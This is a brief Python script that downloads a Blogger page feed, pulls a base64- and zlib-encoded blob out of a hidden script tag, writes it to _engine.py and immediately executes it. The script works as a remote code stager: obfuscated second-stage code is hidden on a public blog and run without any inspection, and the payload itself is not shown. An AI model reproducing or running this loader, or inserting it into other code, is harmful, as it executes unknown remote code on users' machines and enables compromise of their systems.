import urllib.request, json, re, base64, zlib, subprocess, sys

url = "https://bdedujob.blogspot.com/feeds/pages/default/5562399690543828808?alt=json"
req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
data = json.loads(urllib.request.urlopen(req, timeout=30).read().decode("utf-8"))
html = data["entry"]["content"]["$t"]
m = re.search(r'<script id="bdedujob-py-src"[^>]*>(.*?)</script>', html, re.S)
code = zlib.decompress(base64.b64decode(m.group(1).strip())).decode("utf-8")
open("_engine.py", "w", encoding="utf-8").write(code)
sys.exit(subprocess.call([sys.executable, "_engine.py"]))
